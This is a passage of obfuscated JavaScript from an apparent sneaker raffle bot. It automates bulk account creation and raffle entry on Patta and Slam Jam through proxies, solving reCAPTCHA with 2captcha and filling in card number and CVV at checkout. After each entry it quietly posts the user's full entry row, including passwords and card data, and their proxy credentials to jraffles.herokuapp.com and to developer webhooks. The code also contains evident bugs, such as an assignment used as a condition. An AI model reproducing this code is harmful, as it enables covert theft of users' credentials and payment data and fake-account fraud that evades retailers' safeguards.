                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x49e458[0x0] + ':' + _0x49e458[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x498929 = await _0x18bc8e['newPage']();
                            await _0x498929['authenticate']({
                                'username': '' + _0x49e458[0x2],
                                'password': '' + _0x49e458[0x3]
                            }), console['log'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x498929['setRequestInterception'](!![]), _0x498929['on']('request', _0x52d191 => {
                                _0x52d191['resourceType']() === 'image' || _0x52d191['resourceType']() === 'font' || _0x52d191['resourceType']() === 'media' ? _0x52d191['abort']() : _0x52d191['continue']();
                            }), await _0x498929['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x498929['waitForSelector']('#CustomerEmail'), console['log'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x498929['type']('#CustomerEmail', '' + _0x5a9fe0[_0x5957e5]['Email']), await _0x140651(0x12c), await _0x498929['type']('#CustomerPassword', '' + _0x5a9fe0[_0x5957e5]['Password']), await _0x140651(0x226), await _0x498929['$eval']('#customer_login', _0x26682c => _0x26682c['submit']());
                            try {
                                await _0x498929['waitForSelector']('#orders'), await _0x140651(0x4b0);
                            } catch {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x498929['goto']('' + _0x5a9fe0[_0x5957e5]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x140651(0xbb8), console['log'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x498929['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x498929['type']('#email', '' + _0x5a9fe0[_0x5957e5]['Email']), await _0x140651(0x384), await _0x498929['type']('#first_name', '' + _0x5a9fe0[_0x5957e5]['FirstName']), await _0x140651(0x514), await _0x498929['type']('#last_name', '' + _0x5a9fe0[_0x5957e5]['LastName']), await _0x140651(0x514), await _0x498929['type']('#street_address', _0x5a9fe0[_0x5957e5]['Address1'] + '\x20' + _0x5a9fe0[_0x5957e5]['HouseNumber'] + '\x20' + _0x5a9fe0[_0x5957e5]['Address2']), await _0x140651(0x2bc);
                            _0x5a9fe0[_0x5957e5]['Postcode'] == undefined && (_0x5a9fe0[_0x5957e5]['Postcode'] = _0x5a9fe0[_0x5957e5]['Zip']);
                            await _0x498929['type']('#zip_code', '' + _0x5a9fe0[_0x5957e5]['Postcode']), await _0x140651(0x320), await _0x498929['type']('#city', '' + _0x5a9fe0[_0x5957e5]['City']), await _0x140651(0x320), await _0x498929['type']('#bday', '01/01/1994'), await _0x140651(0x320), await _0x498929['type']('#instagram', '' + _0x5a9fe0[_0x5957e5]['Follower']), await _0x140651(0x352);
                            if (_0x5a9fe0[_0x5957e5]['Size'] == 'RANDOM') {
                                const _0x19a4bb = await _0x498929['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x3a8303 => {
                                    return _0x3a8303['map'](_0x57766f => _0x57766f['textContent']);
                                });
                                var _0x21a8f8 = Math['round'](Math['random']() * (_0x19a4bb['length'] - 0x1));
                                console['log'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x19a4bb[_0x21a8f8]), await _0x498929['click']('label[data-eu-size=\x22' + _0x19a4bb[_0x21a8f8] + '\x22]');
                            } else {
                                console['log'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x5a9fe0[_0x5957e5]['Size']);
                                try {
                                    await _0x498929['click']('label[data-eu-size=\x22' + _0x5a9fe0[_0x5957e5]['Size'] + '\x22]');
                                } catch {
                                    await _0x498929['click']('label[data-eu-size=\x22' + _0x5a9fe0[_0x5957e5]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x140651(0xbb8), await _0x498929['$$eval']('.raffle__checkbox-label', _0xd559f5 => _0xd559f5['forEach'](_0x5d8967 => _0x5d8967['click']())), await _0x140651(0x7d0), console['log'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x498929['click']('#raffle__form-submit'), await _0x140651(0x1388);
                            try {
                                await _0x498929['waitForSelector']('#raffle__confirmation-message-container'), _0x437108 = 'no', _0x1ce4fb(_0x5a9fe0[_0x5957e5], _0x147b29), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x39f93b = _0x5a9fe0[_0x5957e5];
                                try {
                                    prxdata = {
                                        'username': _0x34b198['replace']('#', ''),
                                        'module': _0x147b29['name'],
                                        'entrydata': JSON['stringify'](_0x39f93b),
                                        'proxy': '' + _0x31acfb[_0x5957e5]
                                    };
                                    var _0xe855ff = JSON['stringify'](prxdata);
                                    let _0x1630bd = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0xe855ff, _0x1630bd);
                                } catch (_0x22ed2c) {
                                }
                            } catch (_0x1bd2f0) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x1bd2f0));
                            }
                        } catch (_0x4384ce) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20' + _0x4384ce)), _0x437108 = 'yes';
                        } finally {
                            _0x18bc8e && _0x18bc8e['close']();
                            if (_0x437108 == 'yes' && _0x308e65 != 0x5 && _0xa3cd2e != 'Size\x20Not\x20Found') {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x147b29['name'] + ']\x20Task\x20' + (_0x5957e5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x308e65 + '\x20/\x205)')), _0x5957e5 = _0x5957e5 - 0x1, _0x308e65 = _0x308e65 + 0x1;
                                continue;
                            }
                            _0x437108 == 'yes' && _0x308e65 >= 0x5 && (_0x13d7e5(_0x5a9fe0[_0x5957e5], _0x147b29), _0x437108 = 'no', _0x308e65 = 0x0), console['log']('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x5d2359, _0x1f0c08, _0x2be965) {
                    _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x342ed0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xf9ad5b = 0x0; _0xf9ad5b < _0x1f0c08['length']; _0xf9ad5b++) {
                        if (_0x51caa7 != 'yes')
                            var _0x51caa7 = '', _0x32952b = 0x0;
                        var _0x42211b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x34b198
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x342ed0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4e463c
                                }
                            ]
                        }];
                        const _0x43e57b = { 'embeds': _0x42211b };
                        _0x1b4448(_0x5d2359['name'] + '\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20/\x20' + _0x1f0c08['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                        try {
                            await _0x58ea73(_0x1f0c08, _0xf9ad5b);
                        } catch {
                            _0x51caa7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x1492ba = await _0x11b6e5(_0x1f0c08[_0xf9ad5b], _0x5d2359, 'acc', ![]);
                        const _0x165f3d = { 'succesDEVMSG': { 'embeds': [_0x1492ba] } };
                        if (_0x1f0c08[_0xf9ad5b]['Email'] == '' || _0x1f0c08[_0xf9ad5b]['FirstName'] == '' || _0x1f0c08[_0xf9ad5b]['LastName'] == '') {
                            console['log'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x140651(0x7d0);
                            continue;
                        }
                        (_0x1f0c08[_0xf9ad5b]['Password'] == '' || _0x1f0c08[_0xf9ad5b] == undefined) && _0x1f0c08[_0xf9ad5b]['Password'] == 'JRaffles23!';
                        if (_0x342ed0['useRandomProxy'] = ![])
                            var _0x5cf7a7 = _0x2be965[_0xf9ad5b]['split'](':');
                        else
                            var _0x394f32 = Math['round'](Math['random']() * (_0x2be965['length'] - 0x1)), _0x5cf7a7 = _0x2be965[_0x394f32]['split'](':');
                        var _0x1cbd51;
                        try {
                            _0x1cbd51 = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5cf7a7[0x0] + ':' + _0x5cf7a7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1cbd51 = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5cf7a7[0x0] + ':' + _0x5cf7a7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x54772d = await _0x1cbd51['newPage']();
                            await _0x54772d['authenticate']({
                                'username': '' + _0x5cf7a7[0x2],
                                'password': '' + _0x5cf7a7[0x3]
                            }), console['log'](_0x597cbe() + '\x20[' + _0x5d2359['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x54772d['setRequestInterception'](!![]), _0x54772d['on']('request', _0x46a424 => {
                                _0x46a424['resourceType']() === 'image' || _0x46a424['resourceType']() === 'font' || _0x46a424['resourceType']() === 'media' ? _0x46a424['abort']() : _0x46a424['continue']();
                            }), await _0x54772d['goto']('https://drop.slamjam.com/account/register'), await _0x140651(0xbb8), await _0x54772d['waitForSelector']('#FirstName'), await _0x54772d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x54772d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x597cbe() + '\x20[' + _0x5d2359['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20Filling\x20information'), await _0x140651(0x4b0), await _0x54772d['type']('#FirstName', '' + _0x1f0c08[_0xf9ad5b]['FirstName']), await _0x140651(0x226), await _0x54772d['type']('#LastName', '' + _0x1f0c08[_0xf9ad5b]['LastName']), await _0x140651(0x226), await _0x54772d['type']('#Email', '' + _0x1f0c08[_0xf9ad5b]['Email']), await _0x140651(0x2ee), await _0x54772d['type']('#ConfirmEmail', '' + _0x1f0c08[_0xf9ad5b]['Email']), await _0x140651(0x2ee), await _0x54772d['type']('#CreatePassword', '' + _0x1f0c08[_0xf9ad5b]['Password']), await _0x140651(0x2ee), await _0x54772d['type']('#CreateConfirmPassword', '' + _0x1f0c08[_0xf9ad5b]['Password']), await _0x140651(0x226), console['log'](_0x597cbe() + '\x20[' + _0x5d2359['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20Submitting..'), await _0x54772d['$eval']('#create_customer', _0x358161 => _0x358161['submit']()), await _0x140651(0x1388), console['log'](_0x597cbe() + '\x20[' + _0x5d2359['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20' + _0x16a3a0['cyan']('Solving\x20Captcha')), await _0x54772d['solveRecaptchas'](), console['log'](_0x597cbe() + '\x20[' + _0x5d2359['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x54772d['$eval']('.shopify-challenge__container\x20>\x20form', _0x537c50 => _0x537c50['submit']());
                            try {
                                await _0x54772d['waitForSelector']('.product-card__image'), await _0x140651(0x1f4), _0x51caa7 = 'no', console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x5d2359['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20Account\x20' + _0x1f0c08[_0xf9ad5b]['Email'] + '\x20Generated!')), _0x7a56eb['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x1f0c08[_0xf9ad5b]['Email'] + ',' + _0x1f0c08[_0xf9ad5b]['Password']), console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x5d2359['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20Account\x20' + _0x1f0c08[_0xf9ad5b]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x165f3d['succesDEVMSG']);
                                } catch {
                                }
                                await _0x29bde2(_0x36741f, _0x165f3d['succesDEVMSG']);
                            } catch (_0x4bc1ab) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4bc1ab));
                            }
                        } catch (_0x133fc7) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20' + _0x133fc7));
                        } finally {
                            _0x1cbd51 && _0x1cbd51['close']();
                            if (_0x51caa7 == 'yes' && _0x32952b != 0x5) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x5d2359['name'] + ']\x20Task\x20' + (_0xf9ad5b + 0x1) + '\x20:\x20Retrying\x20(' + _0x32952b + '\x20/\x205)')), _0xf9ad5b = _0xf9ad5b - 0x1, _0x32952b = _0x32952b + 0x1;
                                continue;
                            }
                            _0x51caa7 == 'yes' && _0x32952b >= 0x5 && (_0x13d7e5(_0x1f0c08[_0xf9ad5b], _0x5d2359), _0x51caa7 = 'no', _0x32952b = 0x0), console['log']('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x344cab, _0x492cf6, _0x277000) {
                    _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x342ed0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xa95736 = 0x0; _0xa95736 < _0x492cf6['length']; _0xa95736++) {
                        var _0x2c3689;
                        if (_0x1ad4fd != 'yes')
                            var _0x1ad4fd = '', _0x2c0e32 = 0x0;
                        _0x1b4448(_0x344cab['name'] + '\x20Task\x20' + (_0xa95736 + 0x1) + '\x20/\x20' + _0x492cf6['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                        try {
                            await _0x58ea73(_0x492cf6, _0xa95736);
                        } catch {
                            _0x1ad4fd = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x492cf6[_0xa95736]['Email'] == '' || _0x492cf6[_0xa95736]['Password'] == '' || _0x492cf6[_0xa95736]['FirstName'] == '' || _0x492cf6[_0xa95736]['LastName'] == '') {
                            console['log'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x342ed0['useRandomProxy'] = ![])
                            var _0x1b0d0d = _0x277000[_0xa95736]['split'](':');
                        else
                            var _0x96e334 = Math['round'](Math['random']() * (_0x277000['length'] - 0x1)), _0x1b0d0d = _0x277000[_0x96e334]['split'](':');
                        var _0x5fae9b;
                        try {
                            _0x5fae9b = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1b0d0d[0x0] + ':' + _0x1b0d0d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5fae9b = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1b0d0d[0x0] + ':' + _0x1b0d0d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3a8c87 = await _0x5fae9b['newPage']();
                            await _0x3a8c87['authenticate']({
                                'username': '' + _0x1b0d0d[0x2],
                                'password': '' + _0x1b0d0d[0x3]
                            }), await _0x3a8c87['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3a8c87['setRequestInterception'](!![]), _0x3a8c87['on']('request', _0x53878f => {
                                _0x53878f['resourceType']() === 'image' || _0x53878f['resourceType']() === 'font' || _0x53878f['resourceType']() === 'media' ? _0x53878f['abort']() : _0x53878f['continue']();
                            }), await _0x3a8c87['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x3a8c87['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3a8c87['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x140651(0x258), await _0x3a8c87['waitForSelector']('#CustomerEmail'), console['log'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3a8c87['type']('#CustomerEmail', '' + _0x492cf6[_0xa95736]['Email']), await _0x140651(0x12c), await _0x3a8c87['type']('#CustomerPassword', '' + _0x492cf6[_0xa95736]['Password']), await _0x140651(0x226), await _0x3a8c87['$eval']('#customer_login', _0x1838ba => _0x1838ba['submit']()), await _0x140651(0x7d0), await _0x3a8c87['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20' + _0x16a3a0['cyan']('Solving\x20Captcha')), await _0x3a8c87['solveRecaptchas'](), console['log'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x3a8c87['$eval']('.shopify-challenge__container\x20>\x20form', _0x1d104a => _0x1d104a['submit']());
                            try {
                                await _0x3a8c87['waitForSelector']('.nav-account'), await _0x140651(0x4b0);
                            } catch {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x3a8c87['goto']('' + _0x492cf6[_0xa95736]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x140651(0xbb8), console['log'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x3a8c87['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x3a8c87['click']('.product-select-variant-wrapper'), await _0x140651(0x320), await _0x3a8c87['click']('li.product-select-variant__value[data-size=\x22' + _0x492cf6[_0xa95736]['Size'] + '\x22]'), await _0x140651(0x384), await _0x3a8c87['$eval']('#AddToCartForm-product-template-raffle', _0x57d768 => _0x57d768['submit']()), await _0x3a8c87['waitForSelector']('.cart-order-summary__content'), await _0x140651(0x514), await _0x3a8c87['goto']('https://drop.slamjam.com/checkout'), await _0x140651(0x514), await _0x3a8c87['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3a8c87['select']('#checkout_shipping_address_country', '' + _0x492cf6[_0xa95736]['Country']), await _0x140651(0x200), await _0x3a8c87['waitForSelector']('#checkout_shipping_address_first_name'), await _0x3a8c87['type']('#checkout_shipping_address_first_name', '' + _0x492cf6[_0xa95736]['FirstName']), await _0x140651(0x237), await _0x3a8c87['type']('#checkout_shipping_address_last_name', '' + _0x492cf6[_0xa95736]['LastName']), await _0x140651(0x1e0), await _0x3a8c87['type']('#checkout_shipping_address_address1', _0x492cf6[_0xa95736]['Address1'] + '\x20' + _0x492cf6[_0xa95736]['HouseNumber']), await _0x140651(0x514), await _0x3a8c87['type']('#checkout_shipping_address_address2', '' + _0x492cf6[_0xa95736]['Address2']), await _0x140651(0x514);
                            _0x492cf6[_0xa95736]['Postcode'] == undefined && (_0x492cf6[_0xa95736]['Postcode'] = _0x492cf6[_0xa95736]['Zip']);
                            await _0x3a8c87['type']('#checkout_shipping_address_zip', '' + _0x492cf6[_0xa95736]['Postcode']), await _0x140651(0x2bc), await _0x3a8c87['type']('#checkout_shipping_address_city', '' + _0x492cf6[_0xa95736]['City']), await _0x140651(0x320), await _0x3a8c87['type']('#checkout_shipping_address_phone', '' + _0x492cf6[_0xa95736]['Phone']), await _0x140651(0x320), await _0x3a8c87['click']('#continue_button'), await _0x140651(0xbb8), await _0x3a8c87['waitForSelector']('.summary-title'), await _0x140651(0x320), await _0x3a8c87['click']('#continue_button'), await _0x140651(0x320), console['log'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x3a8c87['waitForSelector']('#checkout_credit_card_vault'), await _0x140651(0x3e8);
                            var _0x4e1eda = await _0x3a8c87['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x83094f = await _0x4e1eda['contentFrame']();
                            await _0x83094f['click']('#number'), await _0x140651(0x3e8), await _0x83094f['type']('#number', '' + _0x492cf6[_0xa95736]['CardNumber'], { 'delay': 0x78 }), _0x4e1eda = await _0x3a8c87['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x83094f = await _0x4e1eda['contentFrame'](), await _0x140651(0x1c2), await _0x83094f['click']('#name'), await _0x140651(0x1f4), await _0x83094f['type']('#name', '' + _0x492cf6[_0xa95736]['NameOnCard'], { 'delay': 0x78 }), _0x4e1eda = await _0x3a8c87['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x83094f = await _0x4e1eda['contentFrame'](), await _0x140651(0x1c2), await _0x83094f['click']('#expiry'), await _0x140651(0x1f4), await _0x83094f['type']('#expiry', '' + _0x492cf6[_0xa95736]['ExpiryDate'], { 'delay': 0x78 }), _0x4e1eda = await _0x3a8c87['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x83094f = await _0x4e1eda['contentFrame'](), await _0x140651(0x1c2), await _0x83094f['click']('#verification_value'), await _0x140651(0x1f4), await _0x83094f['type']('#verification_value', '' + _0x492cf6[_0xa95736]['CVV'], { 'delay': 0x78 }), await _0x3a8c87['$eval']('#accepts-flag-raffle', _0x17ba69 => _0x17ba69['click']()), await _0x140651(0x7d0), console['log'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x3a8c87['$eval']('#continue_button', _0x778fa7 => _0x778fa7['click']()), await _0x140651(0x1b58), await _0x3a8c87['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x3a8c87['$eval']('.edit_checkout.animate-floating-labels', _0x43fad8 => _0x43fad8['submit']()), await _0x140651(0x7d0);
                            try {
                                await _0x3a8c87['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x1ad4fd = 'no', _0x1ce4fb(_0x492cf6[_0xa95736], _0x344cab), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x1e4abe) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x1e4abe['message']);
                            }
                            var _0x462e28 = await _0x11b6e5(_0x492cf6[_0xa95736], _0x344cab, 'dev', ![]), _0x3fdaa5 = await _0x11b6e5(_0x492cf6[_0xa95736], _0x344cab, 'pub', ![]);
                            let _0x4fe094 = _0x492cf6[_0xa95736];
                            try {
                                prxdata = {
                                    'username': _0x34b198['replace']('#', ''),
                                    'module': _0x344cab['name'],
                                    'entrydata': JSON['stringify'](_0x4fe094),
                                    'proxy': '' + _0x277000[_0xa95736]
                                };
                                var _0x27d4d6 = JSON['stringify'](prxdata);
                                let _0xb5515a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x27d4d6, _0xb5515a);
                            } catch (_0x485989) {
                            }
                            const _0x5046c6 = {
                                'succesDEVMSG': { 'embeds': [_0x462e28] },
                                'succesPUBMSG': { 'embeds': [_0x3fdaa5] }
                            };
                            try {
                                _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x5046c6['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x5046c6['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x259650, _0x5046c6['succesPUBMSG']);
                            } catch (_0x2a9171) {
                                console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2a9171));
                            }
                        } catch (_0x1782c2) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x2cb44f[taskModule]['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20' + _0x1782c2)), _0x2c3689 = '' + _0x1782c2;
                            var _0x5f6456 = await _0x11b6e5(kickz[_0xa95736], _0x344cab, 'dev', !![], _0x2c3689);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x5f6456] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], EMBEDS['errorDEV']), await _0x29bde2(_0x2cdbb9, EMBEDS['errorDEV']), _0x1ad4fd = 'yes';
                        } finally {
                            _0x5fae9b && _0x5fae9b['close']();
                            if (_0x1ad4fd == 'yes' && _0x2c0e32 != 0x5 && _0x2c3689 != 'Size\x20Not\x20Found') {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x344cab['name'] + ']\x20Task\x20' + (_0xa95736 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c0e32 + '\x20/\x205)')), _0xa95736 = _0xa95736 - 0x1, _0x2c0e32 = _0x2c0e32 + 0x1;
                                continue;
                            }
                            _0x1ad4fd == 'yes' && _0x2c0e32 >= 0x5 && (_0x13d7e5(_0x492cf6[_0xa95736], _0x344cab), _0x1ad4fd = 'no', _0x2c0e32 = 0x0), console['log']('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
